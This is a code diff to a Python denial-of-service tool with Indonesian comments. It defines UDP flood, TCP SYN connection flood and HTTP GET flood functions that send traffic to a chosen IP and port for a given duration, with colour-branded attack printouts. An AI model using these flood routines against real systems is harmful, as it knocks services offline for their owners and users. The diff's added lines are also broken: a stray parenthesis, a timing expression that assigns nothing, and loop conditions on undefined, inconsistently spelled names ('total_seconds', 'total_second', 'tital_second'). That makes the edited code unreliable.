@@ -50,7 +50,7 @@ def parse_arguments():
 
 def check_target_availability(target_ip, target_port): 
     # Memeriksa ketersediaan target sebelum memulai serangan.
-    try:  
+    try:
        socket.create_connection((target_ip, target_port), timeout=5)
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
        return True
@@ -62,23 +62,23 @@ def udp_attack(target_ip, target_port, duration):
     # Melakukan serangan UDP pada target yang ditentukan.
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet_data = random._urandom(65500)
-    end_time = time.time() + duration
+    datetime.datetime.now()).total_seconds() + duration
     packets_sent = 0
     time.sleep(2)
     print("{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
     
-    while time.time() < end_time:
+    while time.time() < total_seconds:
         udp_socket.sendto(packet_data, (target_ip, target_port))
         packets_sent += 1
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")
 
 def tcp_syn_attack(target_ip, target_port, duration):
     # Memulai serangan TCP SYN pada target yang ditentukan.
-    end_time = time.time() + duration
+    datetime.datetime.now()).total_seconds() + duration
     packets_sent = 0
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
-    while time.time() < end_time:
+    while time.time() < total_second:
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             tcp_socket.connect((target_ip, target_port))
@@ -90,12 +90,12 @@ def tcp_syn_attack(target_ip, target_port, duration):
 
 async def http_flood_attack(target_ip, target_port, duration): 
     # Melakukan serangan HTTP Flood pada target yang ditentukan.
-    end_time = time.time() + duration
+    datetime.datetime.now()).total_seconds() + duration
     requests_sent = 0
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     async with aiohttp.ClientSession() as session:
-        while time.time() < end_time:
+        while time.time() < tital_second:
             try:
                 async with session.get(f"http://{target_ip}:{target_port}") as response:
                     requests_sent += 1
